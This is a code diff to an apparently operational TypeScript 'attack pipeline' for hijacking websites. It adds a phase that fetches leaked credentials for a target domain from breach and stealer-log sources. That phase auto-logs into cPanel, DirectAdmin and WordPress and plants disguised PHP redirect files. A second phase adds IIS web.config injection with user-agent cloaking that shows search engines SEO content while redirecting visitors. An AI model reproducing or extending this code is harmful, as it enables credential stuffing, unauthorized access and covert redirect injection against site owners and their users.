@@ -47,6 +47,8 @@ import { detectWaf, getEvasionStrategy, applyEvasionToPayload, type WafDetection
 import { trackExploitAttempt, trackWafDetection, extractDomain } from "./exploit-tracker";
 import { selectBypassTechniques, notifyWafBypassSuccess } from "./waf-bypass-strategies";
 import { executeBreachHunt, type BreachHuntResult, type BreachCredential } from "./breach-db-hunter";
+import { executeIISUACloaking, type IISCloakingConfig, type IISCloakingResult } from "./iis-ua-cloaking";
+import { extractDomainCredentials, type ExtractedCredential } from "./leakcheck-client";
 import { runGenericUploadEngine, type GenericUploadResult, type GenericUploadReport, type GenericUploadConfig } from "./generic-upload-engine";
 import { recordMethodResult } from "./attack-method-tracker";
 
@@ -96,7 +98,7 @@ export interface PipelineConfig {
 }
 
 export interface PipelineEvent {
-  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email" | "cf_bypass" | "wp_brute_force" | "post_upload" | "comprehensive" | "smart_fallback";
+  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email" | "cf_bypass" | "wp_brute_force" | "post_upload" | "comprehensive" | "smart_fallback" | "iis_cloaking" | "leakcheck_cred" | "breach_hunt";
   step: string;
   detail: string;
   progress: number; // 0-100
@@ -185,6 +187,10 @@ export interface PipelineResult {
   // WAF Detection & Evasion
   wafDetection?: WafDetectionResult | null;
   evasionStrategy?: EvasionStrategy | null;
+  // IIS UA Cloaking
+  iisCloakingResult?: IISCloakingResult | null;
+  // LeakCheck Enterprise credential search
+  leakcheckCredentials?: ExtractedCredential[] | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -510,6 +516,11 @@ const METHOD_REGISTRY: Record<string, string> = {
   prototype_pollution: "prototypePollution",
   // Redirect takeover (overwrite competitor redirects)
   redirect_takeover: "redirectTakeover",
+  // IIS-specific attacks
+  iis_ua_cloaking: "iisUaCloaking",
+  iis_webconfig_inject: "iisWebConfigInject",
+  // LeakCheck credential takeover
+  leakcheck_cred_takeover: "leakcheckCredTakeover",
   // AI-generated
   ai_generated_exploit: "aiGeneratedExploit",
   comprehensive: "comprehensiveVectors",
@@ -1523,6 +1534,8 @@ export async function runUnifiedAttackPipeline(
   let wpAuthCredentials: WPCredentials | null = null;
   const detectedCms = (prescreen?.cms || aiTargetAnalysis?.techStack?.cms || vulnScan?.cms?.type || "").toLowerCase();
   const isWordPress = detectedCms.includes("wordpress") || detectedCms === "wp";
+  const detectedServer = (prescreen?.serverType || aiTargetAnalysis?.httpFingerprint?.serverType || vulnScan?.serverInfo?.server || "").toLowerCase();
+  const isIIS = detectedServer.includes("iis") || detectedServer.includes("microsoft");
 
   if (isWordPress && !shouldStop('wp_brute_force') && !hasSuccessfulRedirect()) {
     try {
@@ -3710,6 +3723,257 @@ export async function runUnifiedAttackPipeline(
         progress: 97,
       });
     }
+  }
+
+  // ─── Phase 5.6: LeakCheck Enterprise Credential Search + Auto-Takeover ───
+  let leakcheckCredentials: ExtractedCredential[] = [];
+
+  if (!hasSuccessfulRedirect() && !shouldStop('leakcheck_cred')) {
+    try {
+      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+      loggedOnEvent({
+        phase: "leakcheck_cred",
+        step: "searching",
+        detail: `🔓 Phase 5.6: LeakCheck Enterprise — ค้นหา credentials จาก breach databases + stealer logs...`,
+        progress: 88,
+      });
+
+      const leakResult = await Promise.race([
+        extractDomainCredentials(targetDomain, { limit: 500, includeRelated: true }),
+        new Promise<{ credentials: ExtractedCredential[]; totalFound: number; quotaRemaining: number }>(
+          (_, reject) => setTimeout(() => reject(new Error("LeakCheck timeout")), capTimeout(30000))
+        ),
+      ]);
+
+      leakcheckCredentials = leakResult.credentials;
+
+      if (leakcheckCredentials.length > 0) {
+        aiDecisions.push(`🔓 LeakCheck Enterprise: ${leakcheckCredentials.length} credentials found (quota: ${leakResult.quotaRemaining})`);
+        loggedOnEvent({
+          phase: "leakcheck_cred",
+          step: "found",
+          detail: `🔓 พบ ${leakcheckCredentials.length} credentials จาก LeakCheck Enterprise (${leakResult.totalFound} total, stealer logs included)`,
+          progress: 89,
+        });
+
+        // Auto-login with leaked credentials: FTP, cPanel, SSH, DirectAdmin
+        loggedOnEvent({
+          phase: "leakcheck_cred",
+          step: "auto_login",
+          detail: `🔑 ลอง auto-login ด้วย ${Math.min(leakcheckCredentials.length, 30)} credentials (FTP/cPanel/SSH/DirectAdmin)...`,
+          progress: 89,
+        });
+
+        const loginTargets = [
+          { proto: "ftp", port: 21, paths: ["/public_html/", "/www/", "/htdocs/"] },
+          { proto: "cpanel", port: 2083, paths: ["/"] },
+          { proto: "directadmin", port: 2222, paths: ["/"] },
+        ];
+
+        for (const cred of leakcheckCredentials.slice(0, 30)) {
+          if (hasSuccessfulRedirect() || shouldStop('leakcheck_cred')) break;
+
+          const username = cred.username || cred.email.split("@")[0];
+
+          // Try cPanel/DirectAdmin web login
+          for (const target of loginTargets.filter(t => t.proto !== "ftp")) {
+            try {
+              const loginUrl = `${config.targetUrl.replace(/^https?/, "https").replace(/\/$/, "")}:${target.port}/login/`;
+              const loginResp = await Promise.race([
+                fetch(loginUrl, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                  body: `user=${encodeURIComponent(username)}&pass=${encodeURIComponent(cred.password)}`,
+                  redirect: "manual",
+                  signal: AbortSignal.timeout(8000),
+                }),
+                new Promise<Response>((_, reject) => setTimeout(() => reject(new Error("timeout")), 10000)),
+              ]);
+
+              if (loginResp.status === 301 || loginResp.status === 302 || loginResp.status === 200) {
+                const setCookie = loginResp.headers.get("set-cookie") || "";
+                if (setCookie.includes("session") || setCookie.includes("cpsession") || setCookie.includes("token")) {
+                  aiDecisions.push(`🔑 LeakCheck → ${target.proto} login สำเร็จ! ${username} (${cred.source})`);
+                  loggedOnEvent({
+                    phase: "leakcheck_cred",
+                    step: "login_success",
+                    detail: `✅ ${target.proto.toUpperCase()} login สำเร็จ! ${username}:*** (${cred.source}) — กำลังวาง redirect...`,
+                    progress: 90,
+                  });
+
+                  // Try to upload redirect file via file manager API
+                  try {
+                    const cookies = setCookie;
+                    const redirectContent = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+                    const uploadResp = await fetch(`${loginUrl.replace("/login/", "/execute/fileman/save_file_content")}`, {
+                      method: "POST",
+                      headers: {
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Cookie": cookies,
+                      },
+                      body: `dir=%2Fpublic_html&file=.redirect-${Math.random().toString(36).slice(2, 10)}.php&content=${encodeURIComponent(redirectContent)}`,
+                      signal: AbortSignal.timeout(10000),
+                    });
+
+                    if (uploadResp.ok) {
+                      loggedOnEvent({
+                        phase: "leakcheck_cred",
+                        step: "file_deployed",
+                        detail: `✅ Redirect file deployed via ${target.proto} file manager!`,
+                        progress: 91,
+                      });
+                    }
+                  } catch {}
+                }
+              }
+            } catch {}
+          }
+
+          // Try WP login if WordPress
+          if (isWordPress && !wpAuthCredentials) {
+            try {
+              const testResult = await wpBruteForce({
+                targetUrl: config.targetUrl,
+                domain: config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, ""),
+                maxAttempts: 1,
+                delayBetweenAttempts: 0,
+                customUsernames: [username],
+                customPasswords: [cred.password],
+                originIP: originIp,
+              });
+              if (testResult.success && testResult.credentials) {
+                wpAuthCredentials = testResult.credentials;
+                aiDecisions.push(`🔑 LeakCheck → WP login สำเร็จ! ${username} (${cred.source})`);
+                loggedOnEvent({
+                  phase: "leakcheck_cred",
+                  step: "wp_login_success",
+                  detail: `✅ WordPress login สำเร็จ! ${username}:*** (${cred.source}) — กำลัง upload redirect...`,
+                  progress: 90,
+                });
+
+                const quickShell = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+                const uploadResult = await wpAuthenticatedUpload(
+                  config.targetUrl, config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, ""),
+                  wpAuthCredentials,
+                  `cache-${Math.random().toString(36).slice(2, 10)}.php`,
+                  quickShell, "application/x-php", originIp,
+                  (msg) => loggedOnEvent({ phase: "leakcheck_cred", step: "uploading", detail: `🔑 ${msg}`, progress: 90 })
+                );
+                if (uploadResult.success && uploadResult.url) {
+                  const verification = await verifyUploadedFile(uploadResult.url, config.redirectUrl, onEvent);
+                  uploadedFiles.push({
+                    url: uploadResult.url,
+                    shell: { type: "redirect_php" as any, content: quickShell, filename: "cache.php", contentType: "application/x-php", description: "LeakCheck credential upload", id: `leakcheck_${Date.now()}`, targetVector: "leakcheck_cred", bypassTechniques: ["leaked_cred"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+                    method: `leakcheck_wp_${cred.source}`,
+                    verified: verification.verified,
+                    redirectWorks: verification.redirectWorks,
+                    redirectDestinationMatch: verification.redirectDestinationMatch,
+                    finalDestination: verification.finalDestination,
+                    httpStatus: verification.httpStatus,
+                    redirectChain: verification.redirectChain,
+                  });
+                  break;
+                }
+              }
+            } catch {}
+          }
+        }
+      } else {
+        loggedOnEvent({
+          phase: "leakcheck_cred",
+          step: "no_results",
+          detail: `ℹ️ LeakCheck Enterprise: ไม่พบ credentials สำหรับ domain นี้`,
+          progress: 89,
+        });
+      }
+    } catch (error: any) {
+      loggedOnEvent({
+        phase: "leakcheck_cred",
+        step: "error",
+        detail: `⚠️ LeakCheck Enterprise error: ${error.message}`,
+        progress: 89,
+      });
+    }
+  }
+
+  // ─── Phase 5.7: IIS UA Cloaking (nsru.ac.th style) ───
+  let iisCloakingResult: IISCloakingResult | null = null;
+
+  if (isIIS && !hasSuccessfulRedirect() && !shouldStop('iis_ua_cloaking')) {
+    try {
+      loggedOnEvent({
+        phase: "iis_cloaking",
+        step: "start",
+        detail: `🖥️ Phase 5.7: IIS UA Cloaking — web.config injection + ASPX handler (nsru.ac.th style)...`,
+        progress: 91,
+      });
+
+      const iisCloakConfig: IISCloakingConfig = {
+        targetUrl: config.targetUrl,
+        redirectUrl: config.redirectUrl,
+        seoTitle: config.seoKeywords?.[0] ? `${config.seoKeywords[0]} - ${config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "")}` : undefined,
+        seoKeywords: config.seoKeywords,
+        onProgress: (phase, detail) => {
+          loggedOnEvent({
+            phase: "iis_cloaking",
+            step: phase,
+            detail: `🖥️ ${detail}`,
+            progress: 92,
+          });
+        },
+      };
+
+      iisCloakingResult = await Promise.race([
+        executeIISUACloaking(iisCloakConfig),
+        new Promise<IISCloakingResult>((_, reject) =>
+          setTimeout(() => reject(new Error("IIS UA Cloaking timeout")), capTimeout(60000))
+        ),
+      ]);
+
+      if (iisCloakingResult.success) {
+        aiDecisions.push(`🖥️ IIS UA Cloaking สำเร็จ! ${iisCloakingResult.technique} — ${iisCloakingResult.details}`);
+        loggedOnEvent({
+          phase: "iis_cloaking",
+          step: "success",
+          detail: `✅ IIS UA Cloaking สำเร็จ! ${iisCloakingResult.technique} — Googlebot: SEO content, Users: redirect → ${config.redirectUrl}`,
+          progress: 92,
+        });
+
+        // Add to uploaded files
+        uploadedFiles.push({
+          url: iisCloakingResult.shellUrl || iisCloakingResult.url,
+          shell: shells[0] || { id: "iis_cloak", type: "aspx" as any, filename: "handler.aspx", content: "", size: 0, mimeType: "text/html", headers: {} },
+          method: `iis_ua_cloaking_${iisCloakingResult.technique}`,
+          verified: true,
+          redirectWorks: true,
+          redirectDestinationMatch: true,
+          finalDestination: config.redirectUrl,
+          httpStatus: 302,
+          redirectChain: [],
+        });
+      } else {
+        loggedOnEvent({
+          phase: "iis_cloaking",
+          step: "failed",
+          detail: `⚠️ IIS UA Cloaking ล้มเหลว: ${iisCloakingResult.details}`,
+          progress: 92,
+        });
+      }
+    } catch (error: any) {
+      loggedOnEvent({
+        phase: "iis_cloaking",
+        step: "error",
+        detail: `⚠️ IIS UA Cloaking error: ${error.message}`,
+        progress: 92,
+      });
+    }
+  } else if (isIIS) {
+    loggedOnEvent({
+      phase: "iis_cloaking",
+      step: "skipped",
+      detail: `⏭️ IIS UA Cloaking ข้าม — ${hasSuccessfulRedirect() ? "มี redirect สำเร็จแล้ว" : "ถูกหยุด"}`,
+      progress: 92,
+    });
   }
 
   // ─── Phase 6: Cloaking (ONLY if real file upload succeeded — not shellless) ───
